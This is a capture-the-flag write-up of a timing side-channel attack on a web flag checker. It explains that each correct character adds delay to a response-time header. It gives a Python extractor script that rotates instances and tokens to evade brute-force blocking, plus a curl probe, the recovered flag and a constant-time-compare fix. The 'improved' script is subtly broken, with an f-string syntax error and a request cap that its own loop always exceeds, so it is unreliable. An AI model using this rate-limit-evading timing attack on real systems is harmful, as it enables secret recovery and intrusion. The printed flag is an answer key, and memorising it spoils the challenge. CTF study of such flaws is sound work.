# Huntress 2025 — Flag Checker (Web) Write‑Up
**Category:** Web (Timing Side‑Channel)  
**Author:** Blandman3

---

## TL;DR
The checker compares your submission to the real flag **character by character** and adds a small delay for each correct character. By measuring **`X-Response-Time`**, you can recover the flag one nibble at a time—**even with brute‑force protection**—by rotating instances/tokens and limiting requests per batch.

**Final flag recovered:** `flag{77ba0346d9565e77344b9fe40ecf1369}`

---

## Challenge Recap
> “All you have to do is find the flag… but don’t trip the brute‑force protections.”

There’s no direct injection. Instead, the server leaks information via response time. Every correctly‑matched character contributes ~**+0.100s** to the reported `X-Response-Time`. Example:
- Submitting `flag1x` took ~`0.401s` → ~4 correct chars before the wrong one.
- Submitting `flag{x` took ~`0.502s` → ~5 correct chars correct.

So, **more correct prefix = higher latency**. That’s our oracle.

---

## Signals to Key On
- HTTP header **`X-Response-Time`** (server supplied).
- A **block** page if too many requests are sent from the same instance/IP:
  ```html
  <h2>Stop Hacking!! Your IP has been blocked.</h2>
  ```
- Practical cap observed: **~11 requests** per instance before a block. (I rotated instances/tokens.)

---

## Attack Plan
1. **Fix a known‑good prefix** (start with `flag{`).  
2. For the **next character**, try candidate set: `0123456789abcdef` (hex nibble) and record each request’s `X-Response-Time`.  
3. The **max** timing wins. Append it to the prefix.
4. Repeat until the closing brace `}`.
5. **Respect rate limits**: only 11 requests per instance, then swap to a fresh instance/token and continue.

This is a classic **timing side‑channel** (byte‑by‑byte equality check without constant‑time comparison).

---

## Evidence (Snippets)
First probing (timings rounded):
```text
flag1x  → X-Response-Time: 0.401 s   # 4 chars match
flag{x  → X-Response-Time: 0.502 s   # 5 chars match
```
When blocked:
```http
X-Response-Time: 0.000099
<html><body><h2>Stop Hacking!! Your IP has been blocked.</h2></body></html>
```

---

## My Extractor Script (Improved)
Enhancements over the quick‑and‑dirty version:
- **Batch limiter** (≤10 attempts) before rotating instance/token.
- **Jitter smoothing**: N samples per candidate → median used.
- **Candidate ordering**: try `hex_digits` first (flag format is 32‑hex inside braces).
- **Backoff** on outliers or near‑ties.
- **Graceful restarts** (prefix persisted).

> Replace the placeholders when prompted. Works with the provided proxy instances and `token` cookie.

```python
#!/usr/bin/env python3
import requests, statistics, time, sys
from itertools import cycle

HEX = list("0123456789abcdef")
CANDIDATES = HEX  # flag body is 32 hex chars

SAMPLES_PER_CAND = 2         # jitter control; bump to 3 if noisy
BATCH_LIMIT = 10             # stay < 11 to avoid block
SLEEP_BETWEEN = 0.05         # tiny pacing
TIMEOUT = 10

def prompt_target():
    url = input("Instance URL (e.g., https://<id>.proxy.coursestack.com/): ").strip().rstrip('/')
    token = input("Token (value for cookie `token=`): ").strip()
    return url, {"Cookie": f"token={token}"}

def measure(url, headers, candidate):
    q = f"{url}/submit?flag={candidate}"
    try:
        r = requests.get(q, headers=headers, timeout=TIMEOUT)
        rt = float(r.headers.get("X-Response-Time", "0") or 0)
        return rt, r.status_code
    except Exception as e:
        return 0.0, 599

def best_next_char(prefix, url, headers):
    timings = {}
    attempts = 0
    for ch in CANDIDATES:
        cand = f"{prefix}{ch}}"
        samples = []
        for _ in range(SAMPLES_PER_CAND):
            if attempts >= BATCH_LIMIT:
                return None  # caller must rotate instance
            rt, sc = measure(url, headers, cand)
            samples.append(rt)
            attempts += 1
            time.sleep(SLEEP_BETWEEN)
        timings[ch] = statistics.median(samples)
    # choose the char with max median X-Response-Time
    winner = max(timings.items(), key=lambda kv: kv[1])[0]
    return winner

def main():
    prefix = "flag{"
    target_iter = []
    # collect multiple instances up front if you have them
    while True:
        print("\nAdd an instance (or press Enter to start):")
        u = input("  URL: ").strip()
        if not u:
            break
        t = input("  token: ").strip()
        target_iter.append((u.rstrip('/'), {"Cookie": f"token={t}"}))
    if not target_iter:
        # at least one
        target_iter.append(prompt_target())

    rotator = cycle(target_iter)

    # 32 hex chars expected inside braces
    while len(prefix) < len("flag{") + 32:
        url, headers = next(rotator)
        print(f"\n[+] Working on {url}  (prefix={prefix})")
        ch = best_next_char(prefix, url, headers)
        if ch is None:
            print("   ~ Batch cap hit; rotating instance…")
            continue
        prefix += ch
        print(f"   → appended: {ch}  => {prefix}…")

    full = prefix + "}"
    print("\n[✓] Flag:", full)

if __name__ == "__main__":
    main()
```

### Usage Tips
- If **noise** is high, increase `SAMPLES_PER_CAND` to 3. That triples requests; ensure you have enough instances to rotate.
- If you prematurely hit the block, lower `BATCH_LIMIT` to 8–9 and/or add a 200–300 ms sleep.
- Persist progress by writing the growing prefix to disk after each character.

---

## Run Log (Abbreviated)
Representative samples during my run:
```text
…
flag{77b} : 'b' dominated with ~0.80s median vs ~0.70s for others → accept
…
flag{77ba0346d9565e77344b9fe40ecf1369} : final nibble “9” produced the highest median
```
The final confirmation request returned a stable high timing and accepted by the app.

---

## Root Cause
The server appears to use a non‑constant‑time comparison:
```python
for i, c in enumerate(user_input):
    if c != real_flag[i]:
        return fast_response()
    sleep(0.1)   # or do actual work that costs ~0.1s
```
This leaks how many initial characters are correct.

**Fix:** use a constant‑time equality check (e.g., HMAC‑style compare) and don’t surface raw timing in headers. Add **random jitter** and **uniform work** irrespective of match length.

---

## Result
**Recovered flag:**  
```
flag{77ba0346d9565e77344b9fe40ecf1369}
```

---

## Appendix — Minimal One‑Liner Probe
Quick check for timing signal for a given prefix:
```bash
curl -sS "$URL/submit?flag=flag{deadbeef}" -H "Cookie: token=$TOKEN" -i \
| awk -F': ' '/^X-Response-Time:/ {print $2}'
```

